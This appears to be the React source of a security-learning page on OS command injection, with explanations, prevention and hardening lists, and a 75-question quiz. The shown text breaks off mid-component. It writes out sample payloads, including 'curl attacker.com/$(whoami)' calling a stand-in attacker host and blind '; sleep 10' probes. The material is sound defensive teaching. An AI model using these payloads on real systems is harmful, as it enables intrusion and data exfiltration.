import React from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Button,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  alpha,
  useTheme,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import TerminalIcon from "@mui/icons-material/Terminal";
import WarningIcon from "@mui/icons-material/Warning";
import CodeIcon from "@mui/icons-material/Code";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import QuizIcon from "@mui/icons-material/Quiz";
import { Link, useNavigate } from "react-router-dom";

interface InjectionType {
  title: string;
  description: string;
  example: string;
  color: string;
}

const injectionTypes: InjectionType[] = [
  { title: "Direct Injection", description: "User input directly concatenated into command", example: "ping -c 4 {user_input}", color: "#ef4444" },
  { title: "Blind Injection", description: "No output returned, infer via timing or out-of-band", example: "sleep 10 || curl attacker.com", color: "#f59e0b" },
  { title: "Out-of-Band", description: "Exfiltrate data via DNS, HTTP to external server", example: "curl attacker.com/$(whoami)", color: "#8b5cf6" },
];

const shellMetacharacters = [
  { char: ";", use: "Command separator" },
  { char: "&&", use: "Execute if previous succeeds" },
  { char: "||", use: "Execute if previous fails" },
  { char: "|", use: "Pipe output to next command" },
  { char: "`cmd`", use: "Command substitution (backticks)" },
  { char: "$(cmd)", use: "Command substitution (modern)" },
  { char: ">", use: "Redirect output to file" },
  { char: "\\n", use: "Newline (URL: %0a)" },
];

const commonVulnPatterns = [
  "system(), exec(), shell_exec() with user input",
  "subprocess.call(shell=True) in Python",
  "Runtime.exec() in Java",
  "os.system() / os.popen() in Python",
  "backticks or system() in Ruby/Perl",
  "eval() with user-controlled strings",
];

const commonEntryPoints = [
  { title: "Network utilities", examples: "ping, traceroute, nslookup, curl" },
  { title: "File and backup tooling", examples: "tar, zip, rsync, mysqldump" },
  { title: "Media processing", examples: "ffmpeg, convert, exiftool" },
  { title: "DevOps automation", examples: "git, kubectl, docker, terraform" },
  { title: "Search and reporting", examples: "grep, find, awk, log processors" },
  { title: "Document rendering", examples: "wkhtmltopdf, pandoc, latex" },
];

const detectionSignals = [
  "Shell error messages or unexpected stderr output",
  "Time delays after injected sleeps or long pings",
  "Outbound DNS/HTTP callbacks to unusual domains",
  "Unexpected files created in temp or working dirs",
  "Child processes or command-line args containing user input",
];

const hardeningChecklist = [
  "Use exec/spawn with argument arrays and no shell parsing",
  "Pass -- before user input to prevent option injection",
  "Lock down PATH and environment variables",
  "Allowlist command names and arguments explicitly",
  "Run with minimal privileges and restricted filesystem access",
  "Log command execution with sanitized arguments",
];

const preventionMethods = [
  "Avoid shell commands entirely-use APIs/libraries",
  "Use parameterized commands (subprocess with list args)",
  "Strict input validation (whitelist allowed chars)",
  "Escape shell metacharacters properly",
  "Run with least privilege (drop root)",
  "Use sandboxing/containers for command execution",
];

const ACCENT_COLOR = "#ef4444";
const QUIZ_QUESTION_COUNT = 10;

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "Command injection happens when:",
    options: [
      "User input reaches a system shell without safe handling",
      "A database query fails",
      "A cookie is missing",
      "A page returns 404",
    ],
    correctAnswer: 0,
    explanation: "Unsafe user input passed to a shell can execute OS commands.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "Command injection is severe because it can:",
    options: [
      "Execute arbitrary OS commands",
      "Only change CSS styles",
      "Only read browser cookies",
      "Only slow a page load",
    ],
    correctAnswer: 0,
    explanation: "Attackers can run OS commands on the server.",
  },
  {
    id: 3,
    topic: "Injection Types",
    question: "Direct injection means:",
    options: [
      "User input is concatenated into a command",
      "No output is returned to the user",
      "Requests go to an external server",
      "Only timing is observed",
    ],
    correctAnswer: 0,
    explanation: "Direct injection is immediate command execution via concatenation.",
  },
  {
    id: 4,
    topic: "Injection Types",
    question: "Blind injection is detected by:",
    options: [
      "Timing or side effects",
      "Visible command output",
      "A new login prompt",
      "Only HTTP status codes",
    ],
    correctAnswer: 0,
    explanation: "Blind injection requires timing or out-of-band confirmation.",
  },
  {
    id: 5,
    topic: "Injection Types",
    question: "Out-of-band injection uses:",
    options: [
      "External DNS or HTTP callbacks",
      "Only local files",
      "Only database errors",
      "Only UI changes",
    ],
    correctAnswer: 0,
    explanation: "OOB confirms execution via external callbacks.",
  },
  {
    id: 6,
    topic: "Metacharacters",
    question: "The semicolon (;) is used to:",
    options: ["Separate commands", "Escape quotes", "Start comments", "Encode URLs"],
    correctAnswer: 0,
    explanation: "Semicolon chains commands in many shells.",
  },
  {
    id: 7,
    topic: "Metacharacters",
    question: "The && operator means:",
    options: ["Run next command if previous succeeds", "Run both commands always", "Run next if previous fails", "Start a subshell"],
    correctAnswer: 0,
    explanation: "&& only runs the next command on success.",
  },
  {
    id: 8,
    topic: "Metacharacters",
    question: "The || operator means:",
    options: ["Run next command if previous fails", "Run next if previous succeeds", "Pipe output", "Redirect output"],
    correctAnswer: 0,
    explanation: "|| executes the next command on failure.",
  },
  {
    id: 9,
    topic: "Metacharacters",
    question: "The pipe (|) is used to:",
    options: ["Send output to another command", "End a command", "Escape input", "Create a file"],
    correctAnswer: 0,
    explanation: "Pipes pass output between commands.",
  },
  {
    id: 10,
    topic: "Metacharacters",
    question: "The $(cmd) syntax is:",
    options: ["Command substitution", "A comment", "A file glob", "A variable name"],
    correctAnswer: 0,
    explanation: "$(cmd) executes and substitutes command output.",
  },
  {
    id: 11,
    topic: "Metacharacters",
    question: "Backticks (`cmd`) are used for:",
    options: ["Command substitution", "Redirecting output", "Boolean logic", "Escaping spaces"],
    correctAnswer: 0,
    explanation: "Backticks execute a command and substitute its output.",
  },
  {
    id: 12,
    topic: "Metacharacters",
    question: "The > character is used to:",
    options: ["Redirect output to a file", "Pipe output", "Start a loop", "Escape input"],
    correctAnswer: 0,
    explanation: "Redirects can overwrite or create files.",
  },
  {
    id: 13,
    topic: "Metacharacters",
    question: "A newline injection can be represented as:",
    options: ["%0a", "%2f", "%3f", "%26"],
    correctAnswer: 0,
    explanation: "%0a is a URL-encoded newline.",
  },
  {
    id: 14,
    topic: "Detection",
    question: "A long response delay after 'sleep' indicates:",
    options: ["Blind command injection", "TLS errors", "XSS", "Caching"],
    correctAnswer: 0,
    explanation: "Timing delays are a common blind indicator.",
  },
  {
    id: 15,
    topic: "Detection",
    question: "Unexpected outbound DNS/HTTP traffic suggests:",
    options: ["Out-of-band command injection", "CORS issues", "CSRF", "Session fixation"],
    correctAnswer: 0,
    explanation: "External callbacks often confirm execution.",
  },
  {
    id: 16,
    topic: "Entry Points",
    question: "A common command injection entry point is:",
    options: ["Network utilities like ping", "Static HTML", "CSS files", "Image tags"],
    correctAnswer: 0,
    explanation: "Ping, traceroute, and similar tools are common entry points.",
  },
  {
    id: 17,
    topic: "Entry Points",
    question: "Backup utilities like tar or zip are risky because:",
    options: ["They often accept user input in commands", "They use only GUI", "They run in browsers", "They block all input"],
    correctAnswer: 0,
    explanation: "User-supplied paths or names can be injected.",
  },
  {
    id: 18,
    topic: "Entry Points",
    question: "Media processing tools are risky because:",
    options: ["They frequently wrap OS commands", "They only parse JSON", "They always sanitize input", "They never use shells"],
    correctAnswer: 0,
    explanation: "Many media pipelines shell out to tools like ffmpeg.",
  },
  {
    id: 19,
    topic: "Entry Points",
    question: "DevOps automation tools can be risky when:",
    options: ["Commands include user-supplied input", "They run locally only", "They are read-only", "They use HTTPS"],
    correctAnswer: 0,
    explanation: "Automation often runs privileged commands.",
  },
  {
    id: 20,
    topic: "Entry Points",
    question: "Search or reporting features may be vulnerable because:",
    options: ["They build shell commands from input", "They only read cookies", "They never parse input", "They only render HTML"],
    correctAnswer: 0,
    explanation: "Shell-based filters are common in reporting.",
  },
  {
    id: 21,
    topic: "Vulnerable Patterns",
    question: "Using system() with user input is:",
    options: ["High risk", "Safe by default", "Only a logging issue", "A performance issue"],
    correctAnswer: 0,
    explanation: "system() executes a shell with user input.",
  },
  {
    id: 22,
    topic: "Vulnerable Patterns",
    question: "subprocess.call with shell=True is risky because:",
    options: ["Shell metacharacters are interpreted", "It blocks all input", "It forces HTTPS", "It disables environment variables"],
    correctAnswer: 0,
    explanation: "shell=True enables injection via metacharacters.",
  },
  {
    id: 23,
    topic: "Vulnerable Patterns",
    question: "Runtime.exec in Java is risky when:",
    options: ["Arguments are concatenated from user input", "It uses arrays", "It is not used", "It uses only constants"],
    correctAnswer: 0,
    explanation: "Concatenation can introduce injection.",
  },
  {
    id: 24,
    topic: "Vulnerable Patterns",
    question: "os.system and os.popen are risky because:",
    options: ["They invoke a shell", "They compile code", "They only log output", "They enforce allowlists"],
    correctAnswer: 0,
    explanation: "Shell invocation allows metacharacter injection.",
  },
  {
    id: 25,
    topic: "Vulnerable Patterns",
    question: "Using eval with user input can lead to:",
    options: ["Command execution", "Better validation", "Faster rendering", "Safe parsing"],
    correctAnswer: 0,
    explanation: "eval executes code, enabling injection.",
  },
  {
    id: 26,
    topic: "Vulnerable Patterns",
    question: "Building a command string by concatenation is:",
    options: ["A common source of injection", "Always safe", "Only a UI issue", "Required for security"],
    correctAnswer: 0,
    explanation: "Concatenation mixes user input with commands.",
  },
  {
    id: 27,
    topic: "Prevention",
    question: "Best practice is to:",
    options: ["Avoid shell commands and use libraries", "Always use shell=True", "Allow any characters", "Disable logging"],
    correctAnswer: 0,
    explanation: "Libraries avoid shell interpretation.",
  },
  {
    id: 28,
    topic: "Prevention",
    question: "Using argument arrays with exec/spawn:",
    options: ["Avoids shell parsing", "Enables metacharacters", "Disables validation", "Increases injection risk"],
    correctAnswer: 0,
    explanation: "Array arguments bypass shell parsing.",
  },
  {
    id: 29,
    topic: "Prevention",
    question: "A command allowlist is:",
    options: ["An explicit list of permitted commands", "A list of blocked IPs", "A list of cookies", "A firewall rule"],
    correctAnswer: 0,
    explanation: "Allowlists define safe commands and args.",
  },
  {
    id: 30,
    topic: "Prevention",
    question: "Input validation should be:",
    options: ["Allowlist-based", "Only client-side", "Optional", "Disabled for admins"],
    correctAnswer: 0,
    explanation: "Allowlists reduce unexpected input.",
  },
  {
    id: 31,
    topic: "Prevention",
    question: "Escaping metacharacters is:",
    options: ["Helpful but error-prone", "A complete fix", "Unnecessary", "Only for logging"],
    correctAnswer: 0,
    explanation: "Escaping helps but is not a complete fix.",
  },
  {
    id: 32,
    topic: "Hardening",
    question: "Least privilege reduces risk because:",
    options: ["Compromised commands have limited access", "It disables logging", "It increases privileges", "It hides errors"],
    correctAnswer: 0,
    explanation: "Lower privileges limit impact.",
  },
  {
    id: 33,
    topic: "Hardening",
    question: "Sandboxing helps by:",
    options: ["Restricting filesystem and process access", "Disabling HTTPS", "Expanding PATH", "Skipping validation"],
    correctAnswer: 0,
    explanation: "Sandboxing constrains command execution.",
  },
  {
    id: 34,
    topic: "Hardening",
    question: "Passing -- before user input prevents:",
    options: ["Option injection", "SQL injection", "XSS", "CSRF"],
    correctAnswer: 0,
    explanation: "-- stops option parsing in many tools.",
  },
  {
    id: 35,
    topic: "Hardening",
    question: "Locking down PATH is important because:",
    options: ["Attackers can replace binaries", "It breaks DNS", "It disables TLS", "It creates cookies"],
    correctAnswer: 0,
    explanation: "A poisoned PATH can run malicious binaries.",
  },
  {
    id: 36,
    topic: "Hardening",
    question: "Logging command execution should:",
    options: ["Sanitize sensitive arguments", "Store secrets in plaintext", "Disable monitoring", "Hide errors"],
    correctAnswer: 0,
    explanation: "Logs should avoid exposing secrets.",
  },
  {
    id: 37,
    topic: "Testing",
    question: "A safe proof of command execution is:",
    options: ["whoami or hostname", "rm -rf /", "exfiltrate data", "install a backdoor"],
    correctAnswer: 0,
    explanation: "Use harmless commands for PoC.",
  },
  {
    id: 38,
    topic: "Testing",
    question: "A common blind payload is:",
    options: ["; sleep 5", "SELECT *", "<script>", "../etc/passwd"],
    correctAnswer: 0,
    explanation: "Timing payloads reveal blind execution.",
  },
  {
    id: 39,
    topic: "Testing",
    question: "An OOB test often uses:",
    options: ["curl to a controlled domain", "local file read", "TLS downgrade", "cookie theft"],
    correctAnswer: 0,
    explanation: "External callbacks confirm execution.",
  },
  {
    id: 40,
    topic: "Metacharacters",
    question: "Command substitution allows:",
    options: ["Embedding command output into another command", "URL encoding", "Database joins", "JWT signing"],
    correctAnswer: 0,
    explanation: "Substitution runs a command and inserts output.",
  },
  {
    id: 41,
    topic: "Validation",
    question: "Output encoding prevents:",
    options: ["XSS, not command injection", "Command injection", "SSRF", "SQL injection"],
    correctAnswer: 0,
    explanation: "Encoding output does not stop shell execution.",
  },
  {
    id: 42,
    topic: "Shell",
    question: "The safest approach is to:",
    options: ["Avoid invoking a shell", "Always invoke a shell", "Use eval", "Trust user input"],
    correctAnswer: 0,
    explanation: "Shells interpret metacharacters and expand input.",
  },
  {
    id: 43,
    topic: "Option Injection",
    question: "Option injection occurs when:",
    options: ["User input is treated as command flags", "A file is uploaded", "Cookies are missing", "Errors are hidden"],
    correctAnswer: 0,
    explanation: "Flags can change command behavior.",
  },
  {
    id: 44,
    topic: "Environment",
    question: "Environment variables are risky when:",
    options: ["Commands rely on untrusted PATH or env", "They are read-only", "They are constant", "They are empty"],
    correctAnswer: 0,
    explanation: "Untrusted env values can alter execution.",
  },
  {
    id: 45,
    topic: "Detection",
    question: "Unexpected stderr output can indicate:",
    options: ["Command injection attempts", "Normal caching", "TLS success", "Static content"],
    correctAnswer: 0,
    explanation: "Shell errors can show injection attempts.",
  },
  {
    id: 46,
    topic: "Detection",
    question: "Child processes with user input in args are:",
    options: ["A strong injection signal", "Always normal", "Only UI issues", "Only a network issue"],
    correctAnswer: 0,
    explanation: "User input in child process args can indicate injection.",
  },
  {
    id: 47,
    topic: "Detection",
    question: "Unexpected temp files can indicate:",
    options: ["Command injection side effects", "Better performance", "TLS negotiation", "Normal caching"],
    correctAnswer: 0,
    explanation: "Injected commands often create temp files.",
  },
  {
    id: 48,
    topic: "Detection",
    question: "New outbound connections to strange domains suggest:",
    options: ["OOB injection testing", "Password reset", "Local backup", "Static asset fetch"],
    correctAnswer: 0,
    explanation: "OOB callbacks indicate command execution.",
  },
  {
    id: 49,
    topic: "Metacharacters",
    question: "Which character is commonly used for redirection?",
    options: [">", "?", "@", "="],
    correctAnswer: 0,
    explanation: "> redirects output to a file.",
  },
  {
    id: 50,
    topic: "Metacharacters",
    question: "Which sequence is most likely to chain commands?",
    options: ["&&", "::", "**", "%%"],
    correctAnswer: 0,
    explanation: "&& chains commands on success.",
  },
  {
    id: 51,
    topic: "Metacharacters",
    question: "Which sequence can execute a command inline?",
    options: ["$(cmd)", "{cmd}", "[cmd]", "<cmd>"],
    correctAnswer: 0,
    explanation: "$(cmd) runs the command and substitutes output.",
  },
  {
    id: 52,
    topic: "Metacharacters",
    question: "Which character typically separates piped commands?",
    options: ["|", ":", ",", "~"],
    correctAnswer: 0,
    explanation: "The pipe character separates commands.",
  },
  {
    id: 53,
    topic: "Shell",
    question: "Using shell=False in Python subprocess:",
    options: ["Disables shell parsing", "Enables metacharacters", "Runs in browser", "Ignores arguments"],
    correctAnswer: 0,
    explanation: "shell=False avoids shell interpretation.",
  },
  {
    id: 54,
    topic: "Validation",
    question: "A good allowlist for a ping target is:",
    options: ["Digits and dots only", "Any character", "Only quotes", "Only semicolons"],
    correctAnswer: 0,
    explanation: "Allowing only digits and dots reduces injection risk.",
  },
  {
    id: 55,
    topic: "Fundamentals",
    question: "Command injection differs from SQL injection because it targets:",
    options: ["The OS shell", "Only the database", "Only the browser", "Only CSS"],
    correctAnswer: 0,
    explanation: "Command injection executes OS commands.",
  },
  {
    id: 56,
    topic: "Code Review",
    question: "In code review, risky calls include:",
    options: ["system, exec, shell_exec", "JSON.parse", "Math.round", "Date.now"],
    correctAnswer: 0,
    explanation: "Shell execution functions need careful handling.",
  },
  {
    id: 57,
    topic: "Impact",
    question: "A successful command injection can lead to:",
    options: ["Remote code execution", "Only UI glitches", "Only 404 errors", "Only cache misses"],
    correctAnswer: 0,
    explanation: "Attackers can run OS commands on the host.",
  },
  {
    id: 58,
    topic: "Hardening",
    question: "Why use timeouts on command execution?",
    options: ["Prevent long-running abuse", "Increase output size", "Improve CSS", "Disable logging"],
    correctAnswer: 0,
    explanation: "Timeouts limit resource abuse.",
  },
  {
    id: 59,
    topic: "Hardening",
    question: "Running as root is risky because:",
    options: ["Injected commands have full privileges", "It blocks injection", "It reduces impact", "It disables shells"],
    correctAnswer: 0,
    explanation: "Root access magnifies impact.",
  },
  {
    id: 60,
    topic: "Prevention",
    question: "Which is the strongest mitigation?",
    options: ["Remove shell usage and use safe APIs", "Escape a few characters", "Block one endpoint", "Hide error messages"],
    correctAnswer: 0,
    explanation: "Avoiding the shell removes the root cause.",
  },
  {
    id: 61,
    topic: "Testing",
    question: "Why avoid destructive payloads in testing?",
    options: ["They can damage systems or data", "They prove nothing", "They are required", "They are faster"],
    correctAnswer: 0,
    explanation: "Safe PoCs demonstrate impact without harm.",
  },
  {
    id: 62,
    topic: "Detection",
    question: "A spike in child processes may indicate:",
    options: ["Command injection abuse", "Normal caching", "DNS resolution", "Static assets"],
    correctAnswer: 0,
    explanation: "Unexpected process spawning is suspicious.",
  },
  {
    id: 63,
    topic: "Metacharacters",
    question: "Which is used for command substitution in many shells?",
    options: ["`cmd`", "%%", "::", "##"],
    correctAnswer: 0,
    explanation: "Backticks perform command substitution.",
  },
  {
    id: 64,
    topic: "Prevention",
    question: "Why is client-side validation insufficient?",
    options: ["It can be bypassed", "It blocks all input", "It runs on the server", "It enforces allowlists"],
    correctAnswer: 0,
    explanation: "Attackers can bypass client checks.",
  },
  {
    id: 65,
    topic: "Shell",
    question: "Using a shell expands:",
    options: ["Metacharacters and variables", "Only numbers", "Only static strings", "Only HTTPS"],
    correctAnswer: 0,
    explanation: "Shells expand variables and metacharacters.",
  },
  {
    id: 66,
    topic: "Prevention",
    question: "Which is safer in Node.js?",
    options: ["spawn with args array", "exec with string", "eval user input", "shell=true"],
    correctAnswer: 0,
    explanation: "spawn with args avoids shell parsing.",
  },
  {
    id: 67,
    topic: "Input",
    question: "Allowlisting IPs for ping should:",
    options: ["Reject characters like ; and &", "Allow any characters", "Allow backticks", "Allow pipes"],
    correctAnswer: 0,
    explanation: "Disallow metacharacters to reduce injection risk.",
  },
  {
    id: 68,
    topic: "Detection",
    question: "Command injection can be confirmed by:",
    options: ["External callback to a controlled host", "Changing CSS", "Clearing cache", "Refreshing the page"],
    correctAnswer: 0,
    explanation: "Callbacks confirm server-side execution.",
  },
  {
    id: 69,
    topic: "Hardening",
    question: "Why restrict filesystem access?",
    options: ["Limit impact of injected commands", "Improve UI", "Increase throughput", "Enable cookies"],
    correctAnswer: 0,
    explanation: "Restricted access reduces damage.",
  },
  {
    id: 70,
    topic: "Hardening",
    question: "Using containers for command execution helps by:",
    options: ["Isolating the execution environment", "Disabling TLS", "Allowing any input", "Removing auth"],
    correctAnswer: 0,
    explanation: "Isolation limits lateral impact.",
  },
  {
    id: 71,
    topic: "Detection",
    question: "Which signal is most suspicious?",
    options: ["Command output containing injected input", "Static CSS load", "Image cache hit", "Normal 200 response"],
    correctAnswer: 0,
    explanation: "Injected input in output suggests command execution.",
  },
  {
    id: 72,
    topic: "Testing",
    question: "Why use time-based payloads?",
    options: ["They reveal execution without output", "They fix bugs", "They speed up responses", "They improve logging"],
    correctAnswer: 0,
    explanation: "Timing proves execution in blind cases.",
  },
  {
    id: 73,
    topic: "Prevention",
    question: "Which is NOT a safe mitigation?",
    options: ["Relying on blacklists alone", "Argument arrays", "Allowlists", "Least privilege"],
    correctAnswer: 0,
    explanation: "Blacklists are easy to bypass.",
  },
  {
    id: 74,
    topic: "Fundamentals",
    question: "Option injection can still occur when:",
    options: ["Command is fixed but user input is an argument", "No user input exists", "Only constants are used", "Shell is not used"],
    correctAnswer: 0,
    explanation: "User input as arguments can become flags.",
  },
  {
    id: 75,
    topic: "Prevention",
    question: "The most reliable fix for command injection is to:",
    options: ["Remove shell usage and avoid command construction", "Add more logging", "Hide error messages", "Use GET instead of POST"],
    correctAnswer: 0,
    explanation: "Eliminate shell usage to remove the root cause.",
  },
];


export default function CommandInjectionPage() {
  const navigate = useNavigate();
  const theme = useTheme();

  const pageContext = `Command Injection & OS Command Execution Guide - Covers direct, blind, and out-of-band command injection techniques. Lists shell metacharacters, common entry points, detection signals, vulnerable code patterns, and prevention methods.`;

  return (
    <LearnPageLayout pageTitle="Command Injection" pageContext={pageContext}>
      <Container maxWidth="lg" sx={{ py: 4 }}>
        {/* Header */}
        <Box sx={{ mb: 4 }}>
          <Chip
            component={Link}
            to="/learn"
            icon={<ArrowBackIcon />}
            label="Back to Learning Hub"
            clickable
            variant="outlined"
            sx={{ borderRadius: 2, mb: 2 }}
          />
          <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
            <Box
              sx={{
                width: 64,
                height: 64,
                borderRadius: 2,
                bgcolor: alpha("#ef4444", 0.1),
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <TerminalIcon sx={{ fontSize: 36, color: "#ef4444" }} />
            </Box>
            <Box>
              <Typography variant="h4" sx={{ fontWeight: 800 }}>
                Command Injection
              </Typography>
              <Typography variant="body1" color="text.secondary">
                OS Command Execution Attacks
              </Typography>
            </Box>
          </Box>
          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
            <Chip label="Web Security" color="error" size="small" />
            <Chip label="OWASP A03" size="small" sx={{ bgcolor: alpha("#f59e0b", 0.1), color: "#f59e0b" }} />
            <Chip label="Critical" size="small" sx={{ bgcolor: alpha("#ef4444", 0.1), color: "#ef4444" }} />
          </Box>
        </Box>

        {/* Overview */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <TerminalIcon color="error" /> What is Command Injection?
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ lineHeight: 1.8 }}>
            Command injection occurs when an application passes unsafe user input to a system shell. Attackers 
            can inject shell metacharacters to execute arbitrary OS commands, potentially gaining full control 
            of the server. It's one of the most severe web vulnerabilities.
          </Typography>
          <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.8, mt: 2 }}>
            It frequently shows up in admin tools, diagnostic endpoints, and automation features that wrap OS utilities. 
            Even when the command itself is fixed, option injection can still alter behavior and expose sensitive data.
          </Typography>
        </Paper>

        {/* Injection Types */}
        <Typography variant="h5" sx={{ fontWeight: 700, mb: 3 }}>🎯 Injection Types</Typography>
        <Grid container spacing={2} sx={{ mb: 4 }}>
          {injectionTypes.map((type) => (
            <Grid item xs={12} md={4} key={type.title}>
              <Paper
                sx={{
                  p: 2,
                  height: "100%",
                  borderRadius: 2,
                  border: `1px solid ${alpha(type.color, 0.2)}`,
                  "&:hover": { borderColor: type.color },
                }}
              >
                <Typography variant="subtitle1" sx={{ fontWeight: 700, color: type.color, mb: 0.5 }}>
                  {type.title}
                </Typography>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                  {type.description}
                </Typography>
                <Box sx={{ p: 1, bgcolor: alpha(type.color, 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.8rem" }}>
                  {type.example}
                </Box>
              </Paper>
            </Grid>
          ))}
        </Grid>

        {/* Common Entry Points */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, border: `1px solid ${alpha(theme.palette.divider, 0.1)}` }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <TerminalIcon color="error" /> Common Entry Points
          </Typography>
          <Grid container spacing={2}>
            {commonEntryPoints.map((entry) => (
              <Grid item xs={12} sm={6} md={4} key={entry.title}>
                <Box sx={{ p: 2, borderRadius: 2, bgcolor: alpha(theme.palette.primary.main, 0.04), height: "100%" }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 0.5 }}>
                    {entry.title}
                  </Typography>
                  <Typography variant="body2" color="text.secondary">
                    {entry.examples}
                  </Typography>
                </Box>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Shell Metacharacters */}
        <Paper
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            background: `linear-gradient(135deg, ${alpha("#ef4444", 0.05)}, ${alpha("#f59e0b", 0.05)})`,
            border: `1px solid ${alpha("#ef4444", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <CodeIcon sx={{ color: "#ef4444" }} /> Shell Metacharacters
          </Typography>
          <Grid container spacing={1}>
            {shellMetacharacters.map((m) => (
              <Grid item xs={6} sm={3} key={m.char}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                  <Chip label={m.char} size="small" sx={{ fontFamily: "monospace", fontWeight: 700, minWidth: 50 }} />
                  <Typography variant="caption" color="text.secondary">{m.use}</Typography>
                </Box>
              </Grid>
            ))}
          </Grid>
        </Paper>

        {/* Detection Signals */}
        <Paper
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#f59e0b", 0.05),
            border: `1px solid ${alpha("#f59e0b", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <WarningIcon sx={{ color: "#f59e0b" }} /> Detection Signals
          </Typography>
          <List dense>
            {detectionSignals.map((signal, i) => (
              <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <WarningIcon sx={{ fontSize: 16, color: "#f59e0b" }} />
                </ListItemIcon>
                <ListItemText primary={signal} primaryTypographyProps={{ variant: "body2" }} />
              </ListItem>
            ))}
          </List>
        </Paper>

        {/* Vulnerable Patterns & Prevention */}
        <Grid container spacing={3} sx={{ mb: 4 }}>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#ef4444", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <BugReportIcon sx={{ color: "#ef4444" }} /> Vulnerable Patterns
              </Typography>
              <List dense>
                {commonVulnPatterns.map((p, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <WarningIcon sx={{ fontSize: 16, color: "#ef4444" }} />
                    </ListItemIcon>
                    <ListItemText primary={p} primaryTypographyProps={{ variant: "body2", fontFamily: "monospace", fontSize: "0.8rem" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#10b981", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <SecurityIcon sx={{ color: "#10b981" }} /> Prevention
              </Typography>
              <List dense>
                {preventionMethods.map((m, i) => (
                  <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                    </ListItemIcon>
                    <ListItemText primary={m} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>
        </Grid>

        {/* Hardening Checklist */}
        <Paper
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#10b981", 0.05),
            border: `1px solid ${alpha("#10b981", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: "#10b981" }} /> Hardening Checklist
          </Typography>
          <List dense>
            {hardeningChecklist.map((item, i) => (
              <ListItem key={i} sx={{ py: 0.25, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                </ListItemIcon>
                <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
              </ListItem>
            ))}
          </List>
        </Paper>

        {/* Tip */}
        <Paper
          sx={{
            p: 2,
            mb: 4,
            borderRadius: 2,
            bgcolor: alpha("#f59e0b", 0.05),
            border: `1px solid ${alpha("#f59e0b", 0.2)}`,
            display: "flex",
            alignItems: "center",
            gap: 2,
          }}
        >
          <TipsAndUpdatesIcon sx={{ color: "#f59e0b" }} />
          <Typography variant="body2">
            <strong>Testing Tip:</strong> Try <code>; sleep 10</code> or <code>| ping -c 10 127.0.0.1</code> to detect blind injection via time delays.
          </Typography>
        </Paper>

        {/* Related */}
        <Paper sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha(theme.palette.primary.main, 0.03) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>?? Related Learning</Typography>
          <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
            <Chip label="SQL Injection " clickable onClick={() => navigate("/learn/sql-injection")} sx={{ fontWeight: 600 }} />
            <Chip label="SSRF Guide " clickable onClick={() => navigate("/learn/ssrf")} sx={{ fontWeight: 600 }} />
            <Chip label="OWASP Top 10 " clickable onClick={() => navigate("/learn/owasp")} sx={{ fontWeight: 600 }} />
          </Box>
        </Paper>

        {/* Quiz Section */}
        <Paper
          id="quiz-section"
          sx={{
            p: 4,
